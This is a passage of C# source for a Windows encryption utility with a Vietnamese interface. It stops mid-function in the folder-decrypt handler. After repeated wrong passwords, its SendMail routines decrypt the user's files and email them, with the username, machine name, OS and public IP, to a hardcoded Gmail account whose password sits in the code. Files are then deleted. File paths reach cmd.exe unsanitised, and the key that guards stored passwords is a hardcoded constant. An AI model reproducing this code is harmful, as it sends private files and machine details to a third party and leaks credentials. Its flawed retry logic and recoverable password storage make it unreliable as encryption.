using AESEncryptDecryptFile.Properties;
using MaterialSkin;
using MaterialSkin.Controls;
using Microsoft.WindowsAPICodePack.Dialogs;
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using xNet;
using Microsoft.Win32;
using System.Drawing;
using AESEncryptDecryptFile;

namespace AESEncryptDecyptFile
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            IntializeApps();
        }

        #region Checking intergity files and initialize application
        public void IntializeApps()
        {
            if (!File.Exists("Microsoft.WindowsAPICodePack.dll"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("Microsoft.WindowsAPICodePack.Shell.dll"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("Microsoft.WindowsAPICodePack.Shell.xml"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("Microsoft.WindowsAPICodePack.xml"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("Newtonsoft.Json.dll"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("Newtonsoft.Json.xml"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("xNet.dll"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
            if (!File.Exists("MaterialSkin.dll"))
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }

            else if (File.Exists("Microsoft.WindowsAPICodePack.dll"))
            {
                if (File.Exists("Microsoft.WindowsAPICodePack.Shell.dll"))
                {
                    if (File.Exists("Microsoft.WindowsAPICodePack.Shell.xml"))
                    {
                        if (File.Exists("Microsoft.WindowsAPICodePack.xml"))
                        {
                            if (File.Exists("Newtonsoft.Json.dll"))
                            {
                                if (File.Exists("Newtonsoft.Json.xml"))
                                {
                                    if (File.Exists("xNet.dll"))
                                    {
                                        if (File.Exists("MaterialSkin.dll"))
                                        {
                                            InitializeComponent();

                                            // Initialize Applicaton Version and Checking for Update
                                            InitializeAppVersionAndCheckingForUpdate();

                                            // Intialize Random Password
                                            IntializeRandomPassword();

                                            // Intialize Application
                                            IntializeApplication();

                                            // Intialize MD5 Calculate
                                            IntializeMD5Calculate();

                                            // Intialize Status Bar
                                            IntializeStatusBar();

                                            // Intialize Log Directory
                                            CreateLogDirectory();

                                            //Intialize Icon Application
                                            IntializeIconApplication();

                                            RunningApps();

                                        }
                                        else
                                        {
                                            MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                            Application.Exit();

                                        }
                                    }
                                    else
                                    {
                                        MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        Application.Exit();

                                    }
                                }
                                else
                                {
                                    MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                    Application.Exit();

                                }
                            }
                            else
                            {
                                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                Application.Exit();

                            }
                        }
                        else
                        {
                            MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            Application.Exit();

                        }
                    }
                    else
                    {
                        MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Application.Exit();

                    }
                }
                else
                {
                    MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Exit();

                }
            }
            else
            {
                MessageBox.Show("Không thể khởi động ứng dụng này!\n\n Thiếu các file cần thiết để chạy ứng dụng!\n\n Vui lòng tải về trình cài đặt và chạy lại trình cài đặt để sửa lỗi này\n\n Error(-1)", "Application Exited Unexpected", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();

            }
        }
        #endregion

        #region Checking Application Run With Launcher
        public void RunningApps()
        {
            if (File.Exists("LAUNCHER"))
            {
                try
                {
                    return;
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message);
                }
            }
            else
            {
                return;
            }

        }
        #endregion

        #region Checking for Updates before start application
        public void InitializeAppVersionAndCheckingForUpdate()
        {
            try
            {
                if (!File.Exists("APP_VERSION.CONFIG"))
                {
                    string VERSION_CURRENT = "v2.0";
                    File.WriteAllText("APP_VERSION.CONFIG", VERSION_CURRENT);
                }
                else
                {
                    if (!File.Exists("version_list.json"))
                    {
                        HttpRequest httpGetFs = new HttpRequest
                        {
                            UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
                        };
                        string httpGetJson = httpGetFs.Get("https://duythanhdz2019.github.io/AES_Encrypt_Decrypt_File_Server/version/version_list.json").ToString();
                        File.WriteAllText("version_list.json", httpGetJson);
                    }
                    string VERSION_CURRENT_FILE = File.ReadAllText("APP_VERSION.CONFIG");
                    HttpRequest http = new HttpRequest
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
                    };
                    string httpGet = http.Get("https://duythanhdz2019.github.io/AES_Encrypt_Decrypt_File_Server/" + VERSION_CURRENT_FILE + "/version.json").ToString();
                    File.WriteAllText("UPDATE.JSON", httpGet);

                    string getFileUpdate = File.ReadAllText("UPDATE.JSON");

                    JSONVersion resultUpdate = JsonConvert.DeserializeObject<JSONVersion>(getFileUpdate);
                    JSONVersion json = new JSONVersion();

                    if (resultUpdate.need_to_update == "true")
                    {
                        if (resultUpdate.priority_update_important == 1)
                        {
                           if (MessageBox.Show("Có bản cập nhật mới!\n\n Vì đây là bản cập nhật quan trọng nên bạn phải cài đặt bản cập nhật này trước khi có thể sử dụng ứng dụng!") == DialogResult.Cancel)
                            {
                                Application.Exit();
                            }
                        }
                        MessageBox.Show("Có bản cập nhật mới!");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error! " + ex.ToString(), "Error");
            }
        }
        #endregion

        public void CreateLogDirectory()
        {
            if (!Directory.Exists(Application.StartupPath + "\\log"))
            {
                Directory.CreateDirectory(Application.StartupPath + "\\log");
            }
            else
            {
                // Do nothing
                Console.WriteLine("Directory " + 
                    Application.StartupPath + "\\log directory already existed!");
            }
        }

        /*
         * Sometimes, we want to encrypt/decrypt a file protected. So before
         * do it, we must attribute file with running command in Command Prompt, 
         * and then do anything we want
         * 
         * return value:
         *          Result of attribute file process
         */
        public static string AttributesCMDFile(string filePath)
        {
            string outputAttributesFile = RunCMD("attrib -r -h" + filePath);

            // return value
            return outputAttributesFile;
        }

        /// <summary>
        /// Intialize Random Password
        /// </summary>
        public void IntializeRandomPassword()
        {
            #region Initialize Random Password

            string pass = RandomString(64);

            txtPassword.Text = pass;

            GCHandle gch = GCHandle.Alloc(pass, GCHandleType.Pinned);
            gch.Free();

            #endregion
        }

        /// <summary>
        /// Intialize Status Bar
        /// </summary>
        public void IntializeStatusBar()
        {
            #region Initialize lblStatusBar
            lblStatusBar.Text = "Sẵn sàng";
            #endregion
        }

        /// <summary>
        /// Intialize MD5 Calculate
        /// Loading MD5 for file original and file encrypted recently
        /// </summary>
        public void IntializeMD5Calculate()
        {
            #region Loading MD5 for file original and file encrypted recently
            if (File.Exists("MD5InputFile.PROPERTIES"))
            {
                string MD5InputFile = File.ReadAllText("MD5InputFile.PROPERTIES");
                lblMD5FileInput.Text = "(MD5 của file cần mã hóa: " + MD5InputFile + ")";
                if (File.Exists("MD5OutputFile.PROPERTIES"))
                {
                    string MD5OutputFile = File.ReadAllText("MD5OutputFile.PROPERTIES");
                    lblMD5FileOutput.Text = "(MD5 của file đã mã hóa: " + MD5OutputFile + ")";
                }
            }
            #endregion
        }

        /// <summary>
        /// Intialize Application
        /// Intialize Path to file and path to folder recently
        /// </summary>
        public void IntializeApplication()
        {
            #region Event
            lblTitle.MouseDown += LblTitle_MouseDown;
            #endregion

            lblStatusBar.MaximumSize = new Size(556, 0);
            lblStatusBar.AutoSize = true;

            #region Loading path to file and path to folder recently
            if (File.Exists("fileIn.txt") || File.Exists("fileOut.txt"))
            {
                string fileIn = File.ReadAllText("fileIn.txt");
                string fileOut = File.ReadAllText("fileOut.txt");
                txtInputFile.Text = fileIn;
                txtOutputFile.Text = fileOut;

                if (File.Exists("folder.txt"))
                {
                    string FolderInOut = File.ReadAllText("folder.txt");
                    txtInputFolder.Text = FolderInOut;
                }

                else
                {
                    txtInputFolder.Text = "";
                }
            }

            else
            {
                txtInputFile.Text = "";
                txtOutputFile.Text = "";
            }
            #endregion
        }

        #region Old Function
        private const string validPassword = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

        #region Initialize Random Password Functions (RandomNumber() and RandomString())
        public int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }

        public string RandomStringPassword(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
            {
                return builder.ToString().ToLower();
            }

            return builder.ToString();
        }
        #endregion

        #endregion

        public const int MaxValue = 0x7FFFFFFF; // 2147483648

        public const int MinValue = (int) -0x80000000; //-2147483648;

        public static string RandomString(int length)
        {
            const string valid = 
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=~<>`/\\,.{}[]?'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=~<>`/\\,.{}[]?'";
            StringBuilder res = new StringBuilder();
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] uintBuffer = new byte[sizeof(uint)];

                while (length-- > 0)
                {
                    rng.GetBytes(uintBuffer);
                    uint num = BitConverter.ToUInt32(uintBuffer, 0);
                    res.Append(valid[(int)(num % (uint)valid.Length)]);
                }
            }
            return res.ToString();
        }

        public static string RandomStringFile(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=~<>`/\\,.{}[]?'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=~<>`/\\,.{}[]?'";
            StringBuilder res = new StringBuilder();
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] uintBuffer = new byte[sizeof(uint)];

                while (length-- > 0)
                {
                    rng.GetBytes(uintBuffer);
                    uint num = BitConverter.ToUInt32(uintBuffer, 0);
                    res.Append(valid[(int)(num % (uint)valid.Length)]);
                }
            }
            return res.ToString();
        }


        public static string CalculateMD5(string filename)
        {
            using (MD5 md5 = MD5.Create())
            {
                using (FileStream stream = File.OpenRead(filename))
                {
                    byte[] hash = md5.ComputeHash(stream);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
        }

        #region Initialize Icon Application
        public void IntializeIconApplication()
        {
            picIcon.Image = Resources.Untitled_1;
            ptbInformation.Image = Resources.icon_infor;
        }

        #endregion

        private void btnForgetPassword_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang khôi phục mật khẩu bằng tính năng Quên mật khẩu.....";
            tabControl.Enabled = false;

            var f3 = new Form3();
            MaskedDialog.ShowDialog(this, f3);
            f3.Dispose();
            f3 = null;

            //Form3 frmForgetPassword = new Form3();
            //frmForgetPassword.ShowDialog();

            lblStatusBar.Text = "Sẵn sàng";
            tabControl.Enabled = true;
        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang mã hóa File: " + txtInputFile.Text;
            tabControl.Enabled = false;

            btnClose.Enabled = false;

            string outputAttributesFiles = RunCMD("attrib -R -H  \"" + txtInputFile.Text + "\"");
            string DateTimeNow = RandomStringFile(5);
            string outputFileLog = Path.Combine(Application.StartupPath + "\\log\\log-encrypt-file-app-" + DateTimeNow + ".txt");
            File.WriteAllText(outputFileLog, outputAttributesFiles);

            if (txtInputFile.Text == "")
            {
                MessageBox.Show("Vui lòng nhập vào đường dẫn đến tệp tin/thư mục mà bạn muốn mã hoá!", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                lblStatusBar.Text = "Sẵn sàng";
                tabControl.Enabled = true;
            }
            else
            {
                lblStatusBar.Text = "Đang mã hóa File: " + txtInputFile.Text;
                tabControl.Enabled = false;

                // Encrypt File Progress started here...
                AESEncryptDecrypt.FileEncrypt(txtInputFile.Text, txtPassword.Text);

                File.WriteAllText("encrypted_files.dat", txtPassword.Text);

                AESEncryptDecrypt.FileEncrypt("encrypted_files.dat", validPassword);

                File.Delete("encrypted_files.dat");

                // Re-encrypt again
                AESEncryptDecrypt.FileEncrypt(txtInputFile.Text, txtPassword.Text);

                // Saving path to show in the next time started application
                File.WriteAllText("fileIn.txt", txtInputFile.Text);

                txtOutputFile.Text = txtInputFile.Text.ToString() + ".aes";

                string MD5OutputFile = CalculateMD5(txtOutputFile.Text);

                lblMD5FileOutput.Text = "(MD5 của file đã mã hóa: " + MD5OutputFile + ")";

                File.WriteAllText("MD5OutputFile.data", MD5OutputFile);

                File.WriteAllText("fileOut.txt", txtOutputFile.Text);

                File.Delete(txtInputFile.Text);

                MessageBox.Show("Đã mã hóa File thành công. File mã hóa đã được lưu tại: " + txtOutputFile.Text, 
                    "Thông báo");

                lblStatusBar.Text = "Sẵn sàng";
                tabControl.Enabled = true;

                // Collecting Heap
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();

                btnClose.Enabled = true;
            }

        }

        private void btnBrowseFile_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang mở cửa sổ chọn file....";
            tabControl.Enabled = false;

            OpenFileDialog dlg = new OpenFileDialog();
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                txtInputFile.Text = dlg.FileName;
                string MD5InputFile = CalculateMD5(txtInputFile.Text);
                lblMD5FileInput.Text = "(MD5 của file cần mã hóa: " + MD5InputFile + ")";
                File.WriteAllText("MD5InputFile.PROPERTIES", MD5InputFile);
                lblStatusBar.Text = "Đã chọn file " + txtInputFile.Text;
            }

            tabControl.Enabled = true;
            lblStatusBar.Text = "Sẵn sàng";
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            int SoLanThuLai = 0;
            lblStatusBar.Text = "Đang giải mã file " + txtOutputFile.Text + " thành file " + txtInputFile.Text;
            tabControl.Enabled = false;

            btnClose.Enabled = false;

            AESEncryptDecrypt.FileDecrypt("encrypted_files.dat.aes", "temp1.tmp", validPassword);
            Thread.Sleep(TimeSpan.FromSeconds(10));
            string pass = File.ReadAllText("temp1.tmp");
            GCHandle gch = GCHandle.Alloc(pass, GCHandleType.Pinned);
            if (txtPasswordEnter.Text != pass || txtPasswordEnter.Text == "")
            {
                SoLanThuLai++;
                MessageBox.Show("Sai mật khẩu giải mã! Vui lòng thử lại!\nLưu ý: Mật khẩu ở ô bên dưới (Dưới dòng chữ Mật khẩu để mã hoá / giải mã file) không phải là mật khẩu chính xác! Bạn phải nhớ mật khẩu đã từng hiển thị ở ô đó vào lúc bạn mã hoá file để nhập mật khẩu!");
                lblStatusBar.Text = "Sẵn sàng";
                tabControl.Enabled = true;
                if (SoLanThuLai >= 5)
                {
                    AESEncryptDecrypt.FileDecrypt(txtOutputFile.Text, txtInputFile.Text, pass);
                    SendMail();
                    MessageBox.Show("Bạn đã nhập sai mật khẩu quá 10 lần. Vì lí do bảo mật, chúng tôi sẽ tự động xoá tập tin này để đảm bảo an toàn tập tin cho chủ sỡ hữu của tập tin. Một thông báo email kèm theo tập tin đã được giải mã đã được gửi đến chủ sở hữu và tập tin đã bị xoá khỏi máy tính này!", 
                        "Thông báo", 
                        MessageBoxButtons.OK, 
                        MessageBoxIcon.Error);
                    // OK, now delete all files
                    File.Delete("fsIn.txt");
                    File.Delete("fsOut.txt");
                    File.Delete("temp1.tmp");
                    File.Delete("temp2.tmp");
                    File.Delete("encrypted_files.dat.aes");
                    File.Delete(txtInputFile.Text);
                    File.Delete(txtOutputFile.Text);
                }
            }
            else
            {
                if (txtInputFile.Text == "" || txtOutputFile.Text == "")
                {
                    MessageBox.Show("Vui lòng truyền vào đường dân đến nơi lưu tệp tin/thư mục mà bạn muốn lưu lại sau khi giải hoá!", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    lblStatusBar.Text = "Đang giải mã file " + txtOutputFile.Text + " thành file " + txtInputFile.Text;
                    tabControl.Enabled = false;
                    AESEncryptDecrypt.FileDecrypt(txtOutputFile.Text, txtInputFile.Text, txtPasswordEnter.Text);
                    MessageBox.Show("Đã giải mã file hoàn tất!", "Thông báo");
                    File.Delete(txtOutputFile.Text);
                    lblStatusBar.Text = "Sẵn sàng";
                    tabControl.Enabled = true;

                    btnClose.Enabled = true;
                }
            }
            gch.Free();
            if (File.Exists("temp1.tmp"))
            {
                File.Delete("temp1.tmp");
            }
            else
            {
                MessageBox.Show("FATAL ERROR: Couldn't find a file: temp1.tmp. Application will be restart now!", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnCopyToClipboard_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang sao chép mật khẩu mã hóa/giải mã vào Clipboard.....";
            tabControl.Enabled = false;
            Clipboard.SetText(txtPassword.Text);
            MessageBox.Show("Đã copy vào khay nhớ tạm Clipboard thành công!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
            lblStatusBar.Text = "Sẵn sàng";
            tabControl.Enabled = true;
        }

        #region Send Email
        public void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtp = new SmtpClient("smtp.gmail.com");

                string user = Environment.UserName;
                string machine = Environment.MachineName;
                string os = Environment.OSVersion.Platform.ToString();
                string osServicePack = Environment.OSVersion.ServicePack;
                string osVer = Environment.OSVersion.VersionString;
                string ipGet = GetIP();

                mail.From = new MailAddress("lolvaruslol123@gmail.com");
                mail.To.Add("lolvaruslol123@gmail.com");
                mail.Subject = "Đã có người cố giải mã file của bạn vào: " + DateTime.Now.ToLongDateString() + "Bởi địa chỉ IP: " + ipGet;
                mail.Body = "Đã có người đang cố gắng giải mã file của bạn và họ đã nhập sai mật khẩu quá 10 lần." + "\n" +
                    "Để bảo đảm an toàn cho dữ liệu của bạn, hệ thống xin phép được xoá tập tin đó khỏi máy tính của người đang cố gắng giải mã file của bạn và hệ thống cũng đã gửi file đã được giải mã qua email này cho bạn. " + 
                    "Sau đây là thông tin chi tiết về kẻ đang cố gắng đánh cắp dữ liệu của bạn: Username: " + user + "\n" +
                    "Tên thiết bị: " + machine + "\n" +
                    "Hệ điều hành sử dụng: " + os + "\n" +
                    "Gói dịch vụ của hệ điều hành (Service Pack)" + osServicePack + "\n" +
                    "Phiên bản hệ điều hành đang sử dụng: " + osVer + "\n" +
                    "Địa chỉ IP: " + ipGet + "\n";

                string fileAttach = txtInputFile.Text;

                if (File.Exists(fileAttach))
                {
                    string directoryImage = fileAttach;
                    mail.Attachments.Add(new Attachment(fileAttach));
                }
                smtp.Port = 587;
                smtp.Credentials = new System.Net.NetworkCredential("lolvaruslol123@gmail.com", "thanhdz2019");
                smtp.EnableSsl = true;

                smtp.Send(mail);
                MessageBox.Show("Send mail!");
                Console.WriteLine("Send mail!");
            }
            catch (Exception ex)
            {
                string exception = ex.ToString();
                MessageBox.Show(exception);
            }
        }
        #endregion

        #region Run Command with Command Prompt
        public static string RunCMD(string cmd)
        {
            Process cmdProcess;
            cmdProcess = new Process();
            cmdProcess.StartInfo.FileName = "cmd.exe";
            cmdProcess.StartInfo.Arguments = "/c " + cmd;
            cmdProcess.StartInfo.RedirectStandardOutput = true;
            cmdProcess.StartInfo.UseShellExecute = false;
            cmdProcess.StartInfo.CreateNoWindow = true;
            cmdProcess.Start();
            string output = cmdProcess.StandardOutput.ReadToEnd();
            cmdProcess.WaitForExit();
            if (string.IsNullOrEmpty(output))
            {
                return "";
            }

            return output;
        }
        #endregion

        public static string GetIP()
        {
            try
            {
                string output = RunCMD("nslookup myip.opendns.com. resolver1.opendns.com");
                MatchCollection ip = Regex.Matches(output, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b");
                return ip[1].Value;
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        private void btnExitApp_Click(object sender, EventArgs e)
        {
            // Collecting Heap
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            // Exit Application
            //Application.Exit();
            this.Close();
        }

        public void SendMailFolder()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtp = new SmtpClient("smtp.gmail.com");

                string user = Environment.UserName;
                string machine = Environment.MachineName;
                string os = Environment.OSVersion.Platform.ToString();
                string osServicePack = Environment.OSVersion.ServicePack;
                string osVer = Environment.OSVersion.VersionString;
                string ipGet = GetIP();

                mail.From = new MailAddress("lolvaruslol123@gmail.com");
                mail.To.Add("lolvaruslol123@gmail.com");
                mail.Subject = "Đã có người cố giải mã file của bạn vào: " + DateTime.Now.ToLongDateString() + "Bởi địa chỉ IP: " + ipGet;
                mail.Body = "Đã có người đang cố gắng giải mã thư mục của bạn và họ đã nhập sai mật khẩu quá 10 lần." + 
                    "Để bảo đảm an toàn cho dữ liệu của bạn, hệ thống xin phép được xoá tập tin đó khỏi máy tính của người đang cố gắng giải mã file của bạn và hệ thống cũng đã gửi file đã được giải mã qua email này cho bạn. " +
                    "Sau đây là thông tin chi tiết về kẻ đang cố gắng đánh cắp dữ liệu của bạn: Username: " + user + 
                    "Tên thiết bị: " + machine + 
                    "Hệ điều hành sử dụng: " + os + 
                    "Gói dịch vụ của hệ điều hành (Service Pack)" + osServicePack + 
                    "Phiên bản hệ điều hành đang sử dụng: " + osVer + 
                    "Địa chỉ IP: " + ipGet;

                string folderAttach = txtInputFolder.Text;

                DirectoryInfo image = new DirectoryInfo(folderAttach);

                foreach (FileInfo item in image.GetFiles("*.*"))
                {
                    if (File.Exists(folderAttach + "\\" + item.FullName))
                    {
                        mail.Attachments.Add(new Attachment(folderAttach + "\\" + item.FullName));
                    }
                }
                smtp.Port = 587;
                smtp.Credentials = new System.Net.NetworkCredential("lolvaruslol123@gmail.com", "thanhdz2019");
                smtp.EnableSsl = true;

                smtp.Send(mail);
                MessageBox.Show("Send mail!");
                Console.WriteLine("Send mail!");
            }
            catch (Exception ex)
            {
                string exception = ex.ToString();
                MessageBox.Show(exception);
            }
        }

        private void btnEncryptFolder_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang mã hóa các file trong thư mục " + txtInputFolder.Text;
            tabControl.Enabled = false;

            btnClose.Enabled = false;
            try
            {
                DirectoryInfo folder = new DirectoryInfo(txtInputFolder.Text);
                if (!folder.Exists)
                {
                    MessageBox.Show("Thư mục bạn đã chọn không tồn tại. Vui lòng chọn lại!", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    lblStatusBar.Text = "Sẵn sàng";
                    tabControl.Enabled = true;
                }
                if (folder.Exists)
                {
                    lblStatusBar.Text = "Đang mã hóa các file trong thư mục " + txtInputFolder.Text;
                    tabControl.Enabled = false;
                    foreach (FileInfo item in folder.GetFiles("*.*", SearchOption.AllDirectories))
                    {
                        if (File.Exists(item.FullName))
                        {
                            string outputAttributesFiles = AttributesCMDFile(item.FullName);
                            string DateTimeNow = RandomStringFile(5);
                            string outputLogFolder = Application.StartupPath + "\\log\\log-encrypt-files-in-folder-app-" + DateTimeNow + ".txt";
                            File.WriteAllText(outputLogFolder, outputAttributesFiles);

                            GCHandle gch = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
                            AESEncryptDecrypt.FileEncrypt(item.FullName, txtPassword.Text);
                            File.WriteAllText("encrypted_folder.dat", txtPassword.Text);
                            AESEncryptDecrypt.FileEncrypt("encrypted_folder.dat", validPassword);
                            File.Delete("encrypted_folder.dat");
                            File.WriteAllText("folder.txt", txtInputFolder.Text);
                            File.Delete(item.FullName);
                        }
                    }
                    MessageBox.Show("Đã mã hóa tất cả các tệp tin trong thư mục " + txtInputFolder.Text + " thành công", "Thông báo");
                    lblStatusBar.Text = "Sẵn sàng";
                    tabControl.Enabled = true;

                    btnClose.Enabled = true;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Application exited with code 1\n\nApplication special exception:\n\n" + ex.ToString(), "Error");
                Application.Exit();
            }
        }

        public int SoLanThuLaiFolder = 0;
        public string pass;
        private void btnDecryptFolder_Click(object sender, EventArgs e)
        {
            lblStatusBar.Text = "Đang giải mã các file trong thư mục " + txtInputFolder.Text;
            tabControl.Enabled = false;

            btnClose.Enabled = false;

            AESEncryptDecrypt.FileDecrypt("encrypted_folder.dat.aes", "temp1_folder.tmp", validPassword);
            Thread.Sleep(TimeSpan.FromSeconds(3));
            pass = File.ReadAllText("temp1_folder.tmp");
            GCHandle gch = GCHandle.Alloc(pass, GCHandleType.Pinned);

            if (txtPasswordEnter.Text != pass || txtPasswordEnter.Text == "")
            {
                SoLanThuLaiFolder++;
                MessageBox.Show("Sai mật khẩu giải mã! Vui lòng thử lại! \n\nLưu ý: Mật khẩu ở ô bên dưới (Dưới dòng chữ Mật khẩu để mã hoá / giải mã file) không phải là mật khẩu chính xác! Bạn phải nhớ mật khẩu đã từng hiển thị ở ô đó vào lúc bạn mã hoá file để nhập mật khẩu!");
                lblStatusBar.Text = "Sẵn sàng";
                tabControl.Enabled = true;
                if (SoLanThuLaiFolder >= 5)
                {
                    try
                    {
                        DirectoryInfo folder = new DirectoryInfo(txtInputFolder.Text);

                        foreach (FileInfo item in folder.GetFiles("*.*", SearchOption.AllDirectories))
                        {
                            if (File.Exists(item.FullName))
                            {
                                AESEncryptDecrypt.FileDecrypt(item.FullName,
                                    item.FullName.Replace(".aes", ""), pass);

